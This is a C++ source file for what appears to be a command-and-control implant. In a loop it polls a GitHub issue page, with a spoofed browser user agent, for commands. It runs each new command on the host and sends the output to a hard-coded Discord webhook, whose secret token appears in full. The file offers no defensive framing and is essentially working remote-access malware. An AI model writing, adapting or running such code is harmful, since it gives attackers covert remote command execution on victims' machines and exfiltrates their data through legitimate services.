#include "include/httpRequest.hpp"
#include "include/fileManager.hpp"
#include "include/htmlParser.hpp"
#include "include/cmd.hpp"
#include "include/execCmd.hpp"
#include <iostream>
#include <chrono>
#include <thread>
#include <string> 
#include <vector>  

int main() {
    HttpRequest httpRequest;
    
    std::string url = "https://github.com/Momollax/git-C2-server/issues/2";
    std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";

    Cmd cmd;
    HtmlParser htmlParser(cmd);
    ExecCmd execCmd("");  
    std::size_t previousMatchCount = 0; 
    const std::string& lastContent = cmd.getLastContent();
    while (true) {
        std::string response = httpRequest.get(url, userAgent);
        std::string extractedContent = htmlParser.extractContent(response);
        if (cmd.addContentIfChanged(extractedContent)) {
            const std::vector<std::string>& allContent = cmd.getAllContent();
            if (htmlParser.getcmd_number() != previousMatchCount) {
                ExecCmd execCmd(lastContent);
                std::string commandResult = execCmd.executeCommand();
                //std::cout << commandResult << std::endl;
                previousMatchCount = htmlParser.getcmd_number();
                execCmd.sendToDiscordWebhook("https://discord.com/api/webhooks/1217493774268370984/zbWhTADsVXMMtXVTvzrdCtt5_cB3Zncs04zS_EWHYmJv40e3gfWhZvoq0CAhddaJ0VjM", commandResult);

            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    return 0;
}
